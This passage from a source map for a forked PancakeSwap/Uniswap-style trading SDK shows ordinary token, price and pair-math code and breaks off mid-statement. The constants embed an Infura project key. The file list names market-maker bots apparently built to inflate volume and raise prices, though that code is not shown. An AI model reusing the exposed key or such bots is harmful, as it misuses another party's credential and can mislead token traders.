{"version":3,"file":"sdk.cjs.development.js","sources":["../src/constants.ts","../src/errors.ts","../src/utils.ts","../src/entities/currency.ts","../src/entities/token.ts","../src/entities/fractions/fraction.ts","../src/entities/fractions/currencyAmount.ts","../src/entities/fractions/tokenAmount.ts","../src/entities/fractions/price.ts","../src/entities/pair.ts","../src/entities/route.ts","../src/entities/fractions/percent.ts","../src/entities/trade.ts","../src/router.ts","../src/fetcher.ts","../src/utils/convertNumber.ts","../src/marketMakerEVM/bot_buy_eth.ts","../node_modules/babel-plugin-transform-async-to-promises/helpers.mjs","../src/utils/sendNoti.ts","../src/marketMakerEVM/bot_buy.ts","../src/utils/approve.ts","../src/marketMakerEVM/bot_sell.ts","../src/utils/approveETH.ts","../src/marketMakerEVM/bot_sell_eth.ts","../src/marketMakerEVM/bot_increasePrice.ts","../src/marketMakerEVM/bot_increasePrice_eth.ts","../src/marketMakerEVM/bot_volume.ts","../src/marketMakerEVM/bot_volume_eth.ts","../src/marketMakerEVM/bot_approve.ts","../src/marketMakerEVM/bot_approve_eth.ts","../src/marketMakerEVM/getBalanceToken.ts","../src/marketMakerEVM/getBalanceToken_eth.ts","../src/projects/withdrawOni.ts","../src/marketMakerSOL/buyTokenSOL.ts","../src/marketMakerSOL/sellTokenSOL.ts","../src/marketMakerSOL/unwrapSOL.ts","../src/marketMakerSOL/sendSOL.ts","../src/marketMakerSOL/collectionSOL.ts","../src/marketMakerSOL/withdrawSOL.ts","../src/marketMakerSOL/distributeSOL.ts","../src/marketMakerSOL/claimToken.ts","../src/marketMakerSOL/withdrawToken.ts","../src/projects/sendTokenOTC.ts","../src/projects/distributeUSDT.ts"],"sourcesContent":["import JSBI from 'jsbi'\n\n// exports for external consumption\nexport type BigintIsh = JSBI | bigint | string\n\nexport enum ChainId {\n  MAINNET = 56,\n  BSCTESTNET = 97\n}\n\nexport enum TradeType {\n  EXACT_INPUT,\n  EXACT_OUTPUT\n}\n\nexport enum Rounding {\n  ROUND_DOWN,\n  ROUND_HALF_UP,\n  ROUND_UP\n}\n\n\nexport const INIT_CODE_HASH = '0x00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'\n\nexport const MINIMUM_LIQUIDITY = JSBI.BigInt(1000)\n\n// exports for internal consumption\nexport const ZERO = JSBI.BigInt(0)\nexport const ONE = JSBI.BigInt(1)\nexport const TWO = JSBI.BigInt(2)\nexport const THREE = JSBI.BigInt(3)\nexport const FIVE = JSBI.BigInt(5)\nexport const TEN = JSBI.BigInt(10)\nexport const _100 = JSBI.BigInt(100)\nexport const _998 = JSBI.BigInt(998)\nexport const _1000 = JSBI.BigInt(1000)\n\nexport enum SolidityType {\n  uint8 = 'uint8',\n  uint256 = 'uint256'\n}\n\nexport const SOLIDITY_TYPE_MAXIMA = {\n  [SolidityType.uint8]: JSBI.BigInt('0xff'),\n  [SolidityType.uint256]: JSBI.BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n}\n\nexport const HTTPS_BSC = \"https://bsc-dataseed4.ninicoin.io/\";\nexport const USDT = \"0x55d398326f99059ff775485246999027b3197955\";\nexport const WBNB = \"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\";\nexport const ROUTER_PANCAKE = \"0x10ED43C718714eb63d5aA57B78B54704E256024E\";\nexport const FACTORY_ADDRESS = \"0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73\";\nexport const AMM_CONTRACT = \"0xdfae336e93cc7611fde661e10c6a60f09c9a0262\";\nexport const LIST_RPC_NODES = [\n  \"https://bsc-dataseed4.ninicoin.io/\",\n  \"https://bsc-dataseed3.ninicoin.io/\",\n  \"https://bsc-dataseed2.ninicoin.io/\",\n  \"https://bsc-dataseed1.ninicoin.io/\",\n  \"https://bsc-dataseed1.defibit.io/\",\n  \"https://bsc-dataseed2.defibit.io/\",\n  \"https://bsc-dataseed3.defibit.io/\",\n  \"https://bsc-dataseed4.defibit.io/\",\n  \"https://bsc-dataseed1.ninicoin.io/\",\n  \"https://bsc-dataseed2.ninicoin.io/\",\n  \"https://bsc-dataseed3.ninicoin.io/\",\n  \"https://bsc-dataseed4.ninicoin.io/\",\n]\n\nexport const HTTPS_ETH = \"https://mainnet.infura.io/v3/ffba1579926a470e98adb34ffb50bd4d\";\nexport const USDT_ETH = \"0xdAC17F958D2ee523a2206206994597C13D831ec7\";\nexport const WETH = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\";\nexport const ROUTER_UNI = \"0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\";\nexport const FACTORY_ADDRESS_ETH = \"0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f\";\nexport const AMM_CONTRACT_ETH = \"0x8E75BA2c2fd8Ef11f0f9CC59cAad7cB58C38cA8D\";\nexport const LIST_RPC_NODES_ETH = [\n  \"https://mainnet.infura.io/v3/ffba1579926a470e98adb34ffb50bd4d\",\n  \"https://eth-pokt.nodies.app\",\n  \"https://1rpc.io/eth\",\n  \"https://rpc.lokibuilder.xyz/wallet\",\n  \"https://ethereum-rpc.publicnode.com\",\n  \"https://eth.llamarpc.com\",\n  \"https://rpc.public.curie.radiumblock.co/http/ethereum\",\n  \"https://ethereum.blockpi.network/v1/rpc/public\",\n]\nexport const RECIPIENT = \"EnhfgqvRNERm8Bzu5v41oKQsHbft7dXW8kZf7QGdUsvr\";","// see https://stackoverflow.com/a/41102306\nconst CAN_SET_PROTOTYPE = 'setPrototypeOf' in Object\n\n/**\n * Indicates that the pair has insufficient reserves for a desired output amount. I.e. the amount of output cannot be\n * obtained by sending any amount of input.\n */\nexport class InsufficientReservesError extends Error {\n  public readonly isInsufficientReservesError: true = true\n\n  public constructor() {\n    super()\n    this.name = this.constructor.name\n    if (CAN_SET_PROTOTYPE) Object.setPrototypeOf(this, new.target.prototype)\n  }\n}\n\n/**\n * Indicates that the input amount is too small to produce any amount of output. I.e. the amount of input sent is less\n * than the price of a single unit of output after fees.\n */\nexport class InsufficientInputAmountError extends Error {\n  public readonly isInsufficientInputAmountError: true = true\n\n  public constructor() {\n    super()\n    this.name = this.constructor.name\n    if (CAN_SET_PROTOTYPE) Object.setPrototypeOf(this, new.target.prototype)\n  }\n}\n","import invariant from 'tiny-invariant'\nimport warning from 'tiny-warning'\nimport JSBI from 'jsbi'\nimport pino from 'pino'\nimport { getAddress } from '@ethersproject/address'\n\n\nimport { BigintIsh, ZERO, ONE, TWO, THREE, SolidityType, SOLIDITY_TYPE_MAXIMA } from './constants'\n\nexport function validateSolidityTypeInstance(value: JSBI, solidityType: SolidityType): void {\n  invariant(JSBI.greaterThanOrEqual(value, ZERO), `${value} is not a ${solidityType}.`)\n  invariant(JSBI.lessThanOrEqual(value, SOLIDITY_TYPE_MAXIMA[solidityType]), `${value} is not a ${solidityType}.`)\n}\n\n// warns if addresses are not checksummed\nexport function validateAndParseAddress(address: string): string {\n  try {\n    const checksummedAddress = getAddress(address)\n    warning(address === checksummedAddress, `${address} is not checksummed.`)\n    return checksummedAddress\n  } catch (error) {\n    invariant(false, `${address} is not a valid address.`)\n  }\n}\n\nexport function parseBigintIsh(bigintIsh: BigintIsh): JSBI {\n  return bigintIsh instanceof JSBI\n    ? bigintIsh\n    : typeof bigintIsh === 'bigint'\n      ? JSBI.BigInt(bigintIsh.toString())\n      : JSBI.BigInt(bigintIsh)\n}\n\n// mock the on-chain sqrt function\nexport function sqrt(y: JSBI): JSBI {\n  validateSolidityTypeInstance(y, SolidityType.uint256)\n  let z: JSBI = ZERO\n  let x: JSBI\n  if (JSBI.greaterThan(y, THREE)) {\n    z = y\n    x = JSBI.add(JSBI.divide(y, TWO), ONE)\n    while (JSBI.lessThan(x, z)) {\n      z = x\n      x = JSBI.divide(JSBI.add(JSBI.divide(y, x), x), TWO)\n    }\n  } else if (JSBI.notEqual(y, ZERO)) {\n    z = ONE\n  }\n  return z\n}\n\n// given an array of items sorted by `comparator`, insert an item into its sort index and constrain the size to\n// `maxSize` by removing the last item\nexport function sortedInsert<T>(items: T[], add: T, maxSize: number, comparator: (a: T, b: T) => number): T | null {\n  invariant(maxSize > 0, 'MAX_SIZE_ZERO')\n  // this is an invariant because the interface cannot return multiple removed items if items.length exceeds maxSize\n  invariant(items.length <= maxSize, 'ITEMS_SIZE')\n\n  // short circuit first item add\n  if (items.length === 0) {\n    items.push(add)\n    return null\n  } else {\n    const isFull = items.length === maxSize\n    // short circuit if full and the additional item does not come before the last item\n    if (isFull && comparator(items[items.length - 1], add) <= 0) {\n      return add\n    }\n\n    let lo = 0,\n      hi = items.length\n\n    while (lo < hi) {\n      const mid = (lo + hi) >>> 1\n      if (comparator(items[mid], add) <= 0) {\n        lo = mid + 1\n      } else {\n        hi = mid\n      }\n    }\n    items.splice(lo, 0, add)\n    return isFull ? items.pop()! : null\n  }\n}\nexport const transport = pino.transport({\n  target: 'pino-pretty',\n});\nexport const logger = pino(\n  {\n    level: 'info',\n    redact: ['poolKeys'],\n    serializers: {\n      error: pino.stdSerializers.err,\n    },\n    base: undefined,\n  },\n  transport,\n);\n\nexport const formatAddress = (address: any, before: any, after: any) => address &&\n  `${address.substring(0, before || 4)}.....${address.substring(address.length - after || 6)}`;\n\nexport async function sleep(millis: any) {\n  const second = Number(millis) * 1000;\n  return new Promise((resolve) => setTimeout(resolve, second));\n}\n\nexport function randomIntFromInterval(min: any, max: any) {\n  const random = (Math.random() * (max - min) + min).toFixed(4);\n  return random;\n}","import JSBI from 'jsbi'\n\nimport { SolidityType } from '../constants'\nimport { validateSolidityTypeInstance } from '../utils'\n\n/**\n * A currency is any fungible financial instrument on Ethereum, including Ether and all ERC20 tokens.\n *\n * The only instance of the base class `Currency` is Ether.\n */\nexport class Currency {\n  public readonly decimals: number\n  public readonly symbol?: string\n  public readonly name?: string\n\n  /**\n   * The only instance of the base class `Currency`.\n   */\n  public static readonly ETHER: Currency = new Currency(18, 'BNB', 'Binance')\n\n  /**\n   * Constructs an instance of the base class `Currency`. The only instance of the base class `Currency` is `Currency.ETHER`.\n   * @param decimals decimals of the currency\n   * @param symbol symbol of the currency\n   * @param name of the currency\n   */\n  protected constructor(decimals: number, symbol?: string, name?: string) {\n    validateSolidityTypeInstance(JSBI.BigInt(decimals), SolidityType.uint8)\n\n    this.decimals = decimals\n    this.symbol = symbol\n    this.name = name\n  }\n}\n\nconst ETHER = Currency.ETHER\nexport { ETHER }\n","import invariant from 'tiny-invariant'\nimport { ChainId } from '../constants'\nimport { validateAndParseAddress } from '../utils'\nimport { Currency } from './currency'\n\n/**\n * Represents an ERC20 token with a unique address and some metadata.\n */\nexport class Token extends Currency {\n  public readonly chainId: ChainId\n  public readonly address: string\n\n  public constructor(chainId: ChainId, address: string, decimals: number, symbol?: string, name?: string) {\n    super(decimals, symbol, name)\n    this.chainId = chainId\n    this.address = validateAndParseAddress(address)\n  }\n\n  /**\n   * Returns true if the two tokens are equivalent, i.e. have the same chainId and address.\n   * @param other other token to compare\n   */\n  public equals(other: Token): boolean {\n    // short circuit on reference equality\n    if (this === other) {\n      return true\n    }\n    return this.chainId === other.chainId && this.address === other.address\n  }\n\n  /**\n   * Returns true if the address of this token sorts before the address of the other token\n   * @param other other token to compare\n   * @throws if the tokens have the same address\n   * @throws if the tokens are on different chains\n   */\n  public sortsBefore(other: Token): boolean {\n    invariant(this.chainId === other.chainId, 'CHAIN_IDS')\n    invariant(this.address !== other.address, 'ADDRESSES')\n    return this.address.toLowerCase() < other.address.toLowerCase()\n  }\n}\n\n/**\n * Compares two currencies for equality\n */\nexport function currencyEquals(currencyA: Currency, currencyB: Currency): boolean {\n  if (currencyA instanceof Token && currencyB instanceof Token) {\n    return currencyA.equals(currencyB)\n  } else if (currencyA instanceof Token) {\n    return false\n  } else if (currencyB instanceof Token) {\n    return false\n  } else {\n    return currencyA === currencyB\n  }\n}\n\nexport const WETH = {\n  [ChainId.MAINNET]: new Token(\n    ChainId.MAINNET,\n    '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',\n    18,\n    'WBNB',\n    'Wrapped BNB'\n  ),\n  [ChainId.BSCTESTNET]: new Token(\n    ChainId.BSCTESTNET,\n    '0xaE8E19eFB41e7b96815649A6a60785e1fbA84C1e',\n    18,\n    'WBNB',\n    'Wrapped BNB'\n  )\n}\n","import invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\nimport _Decimal from 'decimal.js-light'\nimport _Big, { RoundingMode } from 'big.js'\nimport toFormat from 'toformat'\n\nimport { BigintIsh, Rounding } from '../../constants'\nimport { ONE } from '../../constants'\nimport { parseBigintIsh } from '../../utils'\n\nconst Decimal = toFormat(_Decimal)\nconst Big = toFormat(_Big)\n\nconst toSignificantRounding = {\n  [Rounding.ROUND_DOWN]: Decimal.ROUND_DOWN,\n  [Rounding.ROUND_HALF_UP]: Decimal.ROUND_HALF_UP,\n  [Rounding.ROUND_UP]: Decimal.ROUND_UP\n}\n\nconst toFixedRounding = {\n  [Rounding.ROUND_DOWN]: RoundingMode.RoundDown,\n  [Rounding.ROUND_HALF_UP]: RoundingMode.RoundHalfUp,\n  [Rounding.ROUND_UP]: RoundingMode.RoundUp\n}\n\nexport class Fraction {\n  public readonly numerator: JSBI\n  public readonly denominator: JSBI\n\n  public constructor(numerator: BigintIsh, denominator: BigintIsh = ONE) {\n    this.numerator = parseBigintIsh(numerator)\n    this.denominator = parseBigintIsh(denominator)\n  }\n\n  // performs floor division\n  public get quotient(): JSBI {\n    return JSBI.divide(this.numerator, this.denominator)\n  }\n\n  // remainder after floor division\n  public get remainder(): Fraction {\n    return new Fraction(JSBI.remainder(this.numerator, this.denominator), this.denominator)\n  }\n\n  public invert(): Fraction {\n    return new Fraction(this.denominator, this.numerator)\n  }\n\n  public add(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    if (JSBI.equal(this.denominator, otherParsed.denominator)) {\n      return new Fraction(JSBI.add(this.numerator, otherParsed.numerator), this.denominator)\n    }\n    return new Fraction(\n      JSBI.add(\n        JSBI.multiply(this.numerator, otherParsed.denominator),\n        JSBI.multiply(otherParsed.numerator, this.denominator)\n      ),\n      JSBI.multiply(this.denominator, otherParsed.denominator)\n    )\n  }\n\n  public subtract(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    if (JSBI.equal(this.denominator, otherParsed.denominator)) {\n      return new Fraction(JSBI.subtract(this.numerator, otherParsed.numerator), this.denominator)\n    }\n    return new Fraction(\n      JSBI.subtract(\n        JSBI.multiply(this.numerator, otherParsed.denominator),\n        JSBI.multiply(otherParsed.numerator, this.denominator)\n      ),\n      JSBI.multiply(this.denominator, otherParsed.denominator)\n    )\n  }\n\n  public lessThan(other: Fraction | BigintIsh): boolean {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return JSBI.lessThan(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(otherParsed.numerator, this.denominator)\n    )\n  }\n\n  public equalTo(other: Fraction | BigintIsh): boolean {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return JSBI.equal(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(otherParsed.numerator, this.denominator)\n    )\n  }\n\n  public greaterThan(other: Fraction | BigintIsh): boolean {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return JSBI.greaterThan(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(otherParsed.numerator, this.denominator)\n    )\n  }\n\n  public multiply(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return new Fraction(\n      JSBI.multiply(this.numerator, otherParsed.numerator),\n      JSBI.multiply(this.denominator, otherParsed.denominator)\n    )\n  }\n\n  public divide(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return new Fraction(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(this.denominator, otherParsed.numerator)\n    )\n  }\n\n  public toSignificant(\n    significantDigits: number,\n    format: object = { groupSeparator: '' },\n    rounding: Rounding = Rounding.ROUND_HALF_UP\n  ): string {\n    invariant(Number.isInteger(significantDigits), `${significantDigits} is not an integer.`)\n    invariant(significantDigits > 0, `${significantDigits} is not positive.`)\n\n    Decimal.set({ precision: significantDigits + 1, rounding: toSignificantRounding[rounding] })\n    const quotient = new Decimal(this.numerator.toString())\n      .div(this.denominator.toString())\n      .toSignificantDigits(significantDigits)\n    return quotient.toFormat(quotient.decimalPlaces(), format)\n  }\n\n  public toFixed(\n    decimalPlaces: number,\n    format: object = { groupSeparator: '' },\n    rounding: Rounding = Rounding.ROUND_HALF_UP\n  ): string {\n    invariant(Number.isInteger(decimalPlaces), `${decimalPlaces} is not an integer.`)\n    invariant(decimalPlaces >= 0, `${decimalPlaces} is negative.`)\n\n    Big.DP = decimalPlaces\n    Big.RM = toFixedRounding[rounding]\n    return new Big(this.numerator.toString()).div(this.denominator.toString()).toFormat(decimalPlaces, format)\n  }\n}\n","import { currencyEquals } from '../token'\nimport { Currency, ETHER } from '../currency'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\nimport _Big from 'big.js'\nimport toFormat from 'toformat'\n\nimport { BigintIsh, Rounding, TEN, SolidityType } from '../../constants'\nimport { parseBigintIsh, validateSolidityTypeInstance } from '../../utils'\nimport { Fraction } from './fraction'\n\nconst Big = toFormat(_Big)\n\nexport class CurrencyAmount extends Fraction {\n  public readonly currency: Currency\n\n  /**\n   * Helper that calls the constructor with the ETHER currency\n   * @param amount ether amount in wei\n   */\n  public static ether(amount: BigintIsh): CurrencyAmount {\n    return new CurrencyAmount(ETHER, amount)\n  }\n\n  // amount _must_ be raw, i.e. in the native representation\n  protected constructor(currency: Currency, amount: BigintIsh) {\n    const parsedAmount = parseBigintIsh(amount)\n    validateSolidityTypeInstance(parsedAmount, SolidityType.uint256)\n\n    super(parsedAmount, JSBI.exponentiate(TEN, JSBI.BigInt(currency.decimals)))\n    this.currency = currency\n  }\n\n  public get raw(): JSBI {\n    return this.numerator\n  }\n\n  public add(other: CurrencyAmount): CurrencyAmount {\n    invariant(currencyEquals(this.currency, other.currency), 'TOKEN')\n    return new CurrencyAmount(this.currency, JSBI.add(this.raw, other.raw))\n  }\n\n  public subtract(other: CurrencyAmount): CurrencyAmount {\n    invariant(currencyEquals(this.currency, other.currency), 'TOKEN')\n    return new CurrencyAmount(this.currency, JSBI.subtract(this.raw, other.raw))\n  }\n\n  public toSignificant(\n    significantDigits: number = 6,\n    format?: object,\n    rounding: Rounding = Rounding.ROUND_DOWN\n  ): string {\n    return super.toSignificant(significantDigits, format, rounding)\n  }\n\n  public toFixed(\n    decimalPlaces: number = this.currency.decimals,\n    format?: object,\n    rounding: Rounding = Rounding.ROUND_DOWN\n  ): string {\n    invariant(decimalPlaces <= this.currency.decimals, 'DECIMALS')\n    return super.toFixed(decimalPlaces, format, rounding)\n  }\n\n  public toExact(format: object = { groupSeparator: '' }): string {\n    Big.DP = this.currency.decimals\n    return new Big(this.numerator.toString()).div(this.denominator.toString()).toFormat(format)\n  }\n}\n","import { CurrencyAmount } from './currencyAmount'\nimport { Token } from '../token'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\n\nimport { BigintIsh } from '../../constants'\n\nexport class TokenAmount extends CurrencyAmount {\n  public readonly token: Token\n\n  // amount _must_ be raw, i.e. in the native representation\n  public constructor(token: Token, amount: BigintIsh) {\n    super(token, amount)\n    this.token = token\n  }\n\n  public add(other: TokenAmount): TokenAmount {\n    invariant(this.token.equals(other.token), 'TOKEN')\n    return new TokenAmount(this.token, JSBI.add(this.raw, other.raw))\n  }\n\n  public subtract(other: TokenAmount): TokenAmount {\n    invariant(this.token.equals(other.token), 'TOKEN')\n    return new TokenAmount(this.token, JSBI.subtract(this.raw, other.raw))\n  }\n}\n","import { Token } from '../token'\nimport { TokenAmount } from './tokenAmount'\nimport { currencyEquals } from '../token'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\n\nimport { BigintIsh, Rounding, TEN } from '../../constants'\nimport { Currency } from '../currency'\nimport { Route } from '../route'\nimport { Fraction } from './fraction'\nimport { CurrencyAmount } from './currencyAmount'\n\nexport class Price extends Fraction {\n  public readonly baseCurrency: Currency // input i.e. denominator\n  public readonly quoteCurrency: Currency // output i.e. numerator\n  public readonly scalar: Fraction // used to adjust the raw fraction w/r/t the decimals of the {base,quote}Token\n\n  public static fromRoute(route: Route): Price {\n    const prices: Price[] = []\n    for (const [i, pair] of route.pairs.entries()) {\n      prices.push(\n        route.path[i].equals(pair.token0)\n          ? new Price(pair.reserve0.currency, pair.reserve1.currency, pair.reserve0.raw, pair.reserve1.raw)\n          : new Price(pair.reserve1.currency, pair.reserve0.currency, pair.reserve1.raw, pair.reserve0.raw)\n      )\n    }\n    return prices.slice(1).reduce((accumulator, currentValue) => accumulator.multiply(currentValue), prices[0])\n  }\n\n  // denominator and numerator _must_ be raw, i.e. in the native representation\n  public constructor(baseCurrency: Currency, quoteCurrency: Currency, denominator: BigintIsh, numerator: BigintIsh) {\n    super(numerator, denominator)\n\n    this.baseCurrency = baseCurrency\n    this.quoteCurrency = quoteCurrency\n    this.scalar = new Fraction(\n      JSBI.exponentiate(TEN, JSBI.BigInt(baseCurrency.decimals)),\n      JSBI.exponentiate(TEN, JSBI.BigInt(quoteCurrency.decimals))\n    )\n  }\n\n  public get raw(): Fraction {\n    return new Fraction(this.numerator, this.denominator)\n  }\n\n  public get adjusted(): Fraction {\n    return super.multiply(this.scalar)\n  }\n\n  public invert(): Price {\n    return new Price(this.quoteCurrency, this.baseCurrency, this.numerator, this.denominator)\n  }\n\n  public multiply(other: Price): Price {\n    invariant(currencyEquals(this.quoteCurrency, other.baseCurrency), 'TOKEN')\n    const fraction = super.multiply(other)\n    return new Price(this.baseCurrency, other.quoteCurrency, fraction.denominator, fraction.numerator)\n  }\n\n  // performs floor division on overflow\n  public quote(currencyAmount: CurrencyAmount): CurrencyAmount {\n    invariant(currencyEquals(currencyAmount.currency, this.baseCurrency), 'TOKEN')\n    if (this.quoteCurrency instanceof Token) {\n      return new TokenAmount(this.quoteCurrency, super.multiply(currencyAmount.raw).quotient)\n    }\n    return CurrencyAmount.ether(super.multiply(currencyAmount.raw).quotient)\n  }\n\n  public toSignificant(significantDigits: number = 6, format?: object, rounding?: Rounding): string {\n    return this.adjusted.toSignificant(significantDigits, format, rounding)\n  }\n\n  public toFixed(decimalPlaces: number = 4, format?: object, rounding?: Rounding): string {\n    return this.adjusted.toFixed(decimalPlaces, format, rounding)\n  }\n}\n","import { Price } from './fractions/price'\nimport { TokenAmount } from './fractions/tokenAmount'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\nimport { pack, keccak256 } from '@ethersproject/solidity'\nimport { getCreate2Address } from '@ethersproject/address'\n\nimport {\n  BigintIsh,\n  FACTORY_ADDRESS,\n  INIT_CODE_HASH,\n  MINIMUM_LIQUIDITY,\n  ZERO,\n  ONE,\n  FIVE,\n  _998,\n  _1000,\n  ChainId\n} from '../constants'\nimport { sqrt, parseBigintIsh } from '../utils'\nimport { InsufficientReservesError, InsufficientInputAmountError } from '../errors'\nimport { Token } from './token'\n\nlet PAIR_ADDRESS_CACHE: { [token0Address: string]: { [token1Address: string]: string } } = {}\n\nexport class Pair {\n  public readonly liquidityToken: Token\n  private readonly tokenAmounts: [TokenAmount, TokenAmount]\n\n  public static getAddress(tokenA: Token, tokenB: Token): string {\n    const tokens = tokenA.sortsBefore(tokenB) ? [tokenA, tokenB] : [tokenB, tokenA] // does safety checks\n\n    if (PAIR_ADDRESS_CACHE?.[tokens[0].address]?.[tokens[1].address] === undefined) {\n      PAIR_ADDRESS_CACHE = {\n        ...PAIR_ADDRESS_CACHE,\n        [tokens[0].address]: {\n          ...PAIR_ADDRESS_CACHE?.[tokens[0].address],\n          [tokens[1].address]: getCreate2Address(\n            FACTORY_ADDRESS,\n            keccak256(['bytes'], [pack(['address', 'address'], [tokens[0].address, tokens[1].address])]),\n            INIT_CODE_HASH\n          )\n        }\n      }\n    }\n\n    return PAIR_ADDRESS_CACHE[tokens[0].address][tokens[1].address]\n  }\n\n  public constructor(tokenAmountA: TokenAmount, tokenAmountB: TokenAmount) {\n    const tokenAmounts = tokenAmountA.token.sortsBefore(tokenAmountB.token) // does safety checks\n      ? [tokenAmountA, tokenAmountB]\n      : [tokenAmountB, tokenAmountA]\n    this.liquidityToken = new Token(\n      tokenAmounts[0].token.chainId,\n      Pair.getAddress(tokenAmounts[0].token, tokenAmounts[1].token),\n      18,\n      'UNI-V2',\n      'Uniswap V2'\n    )\n    this.tokenAmounts = tokenAmounts as [TokenAmount, TokenAmount]\n  }\n\n  /**\n   * Returns true if the token is either token0 or token1\n   * @param token to check\n   */\n  public involvesToken(token: Token): boolean {\n    return token.equals(this.token0) || token.equals(this.token1)\n  }\n\n  /**\n   * Returns the current mid price of the pair in terms of token0, i.e. the ratio of reserve1 to reserve0\n   */\n  public get token0Price(): Price {\n    return new Price(this.token0, this.token1, this.tokenAmounts[0].raw, this.tokenAmounts[1].raw)\n  }\n\n  /**\n   * Returns the current mid price of the pair in terms of token1, i.e. the ratio of reserve0 to reserve1\n   */\n  public get token1Price(): Price {\n    return new Price(this.token1, this.token0, this.tokenAmounts[1].raw, this.tokenAmounts[0].raw)\n  }\n\n  /**\n   * Return the price of the given token in terms of the other token in the pair.\n   * @param token token to return price of\n   */\n  public priceOf(token: Token): Price {\n    invariant(this.involvesToken(token), 'TOKEN')\n    return token.equals(this.token0) ? this.token0Price : this.token1Price\n  }\n\n  /**\n   * Returns the chain ID of the tokens in the pair.\n   */\n  public get chainId(): ChainId {\n    return this.token0.chainId\n  }\n\n  public get token0(): Token {\n    return this.tokenAmounts[0].token\n  }\n\n  public get token1(): Token {\n    return this.tokenAmounts[1].token\n  }\n\n  public get reserve0(): TokenAmount {\n    return this.tokenAmounts[0]\n  }\n\n  public get reserve1(): TokenAmount {\n    return this.tokenAmounts[1]\n  }\n\n  public reserveOf(token: Token): TokenAmount {\n    invariant(this.involvesToken(token), 'TOKEN')\n    return token.equals(this.token0) ? this.reserve0 : this.reserve1\n  }\n\n  public getOutputAmount(inputAmount: TokenAmount): [TokenAmount, Pair] {\n    invariant(this.involvesToken(inputAmount.token), 'TOKEN')\n    if (JSBI.equal(this.reserve0.raw, ZERO) || JSBI.equal(this.reserve1.raw, ZERO)) {\n      throw new InsufficientReservesError()\n    }\n    const inputReserve = this.reserveOf(inputAmount.token)\n    const outputReserve = this.reserveOf(inputAmount.token.equals(this.token0) ? this.token1 : this.token0)\n    const inputAmountWithFee = JSBI.multiply(inputAmount.raw, _998)\n    const numerator = JSBI.multiply(inputAmountWithFee, outputReserve.raw)\n    const denominator = JSBI.add(JSBI.multiply(inputReserve.raw, _1000), inputAmountWithFee)\n    const outputAmount = new TokenAmount(\n      inputAmount.token.equals(this.token0) ? this.token1 : this.token0,\n      JSBI.divide(numerator, denominator)\n    )\n    if (JSBI.equal(outputAmount.raw, ZERO)) {\n      throw new InsufficientInputAmountError()\n    }\n    return [outputAmount, new Pair(inputReserve.add(inputAmount), outputReserve.subtract(outputAmount))]\n  }\n\n  public getInputAmount(outputAmount: TokenAmount): [TokenAmount, Pair] {\n    invariant(this.involvesToken(outputAmount.token), 'TOKEN')\n    if (\n      JSBI.equal(this.reserve0.raw, ZERO) ||\n      JSBI.equal(this.reserve1.raw, ZERO) ||\n      JSBI.greaterThanOrEqual(outputAmount.raw, this.reserveOf(outputAmount.token).raw)\n    ) {\n      throw new InsufficientReservesError()\n    }\n\n    const outputReserve = this.reserveOf(outputAmount.token)\n    const inputReserve = this.reserveOf(outputAmount.token.equals(this.token0) ? this.token1 : this.token0)\n    const numerator = JSBI.multiply(JSBI.multiply(inputReserve.raw, outputAmount.raw), _1000)\n    const denominator = JSBI.multiply(JSBI.subtract(outputReserve.raw, outputAmount.raw), _998)\n    const inputAmount = new TokenAmount(\n      outputAmount.token.equals(this.token0) ? this.token1 : this.token0,\n      JSBI.add(JSBI.divide(numerator, denominator), ONE)\n    )\n    return [inputAmount, new Pair(inputReserve.add(inputAmount), outputReserve.subtract(outputAmount))]\n  }\n\n  public getLiquidityMinted(\n    totalSupply: TokenAmount,\n    tokenAmountA: TokenAmount,\n    tokenAmountB: TokenAmount\n  ): TokenAmount {\n    invariant(totalSupply.token.equals(this.liquidityToken), 'LIQUIDITY')\n    const tokenAmounts = tokenAmountA.token.sortsBefore(tokenAmountB.token) // does safety checks\n      ? [tokenAmountA, tokenAmountB]\n      : [tokenAmountB, tokenAmountA]\n    invariant(tokenAmounts[0].token.equals(this.token0) && tokenAmounts[1].token.equals(this.token1), 'TOKEN')\n\n    let liquidity: JSBI\n    if (JSBI.equal(totalSupply.raw, ZERO)) {\n      liquidity = JSBI.subtract(sqrt(JSBI.multiply(tokenAmounts[0].raw, tokenAmounts[1].raw)), MINIMUM_LIQUIDITY)\n    } else {\n      const amount0 = JSBI.divide(JSBI.multiply(tokenAmounts[0].raw, totalSupply.raw), this.reserve0.raw)\n      const amount1 = JSBI.divide(JSBI.multiply(tokenAmounts[1].raw, totalSupply.raw), this.reserve1.raw)\n      liquidity = JSBI.lessThanOrEqual(amount0, amount1) ? amount0 : amount1\n    }\n    if (!JSBI.greaterThan(liquidity, ZERO)) {\n      throw new InsufficientInputAmountError()\n    }\n    return new 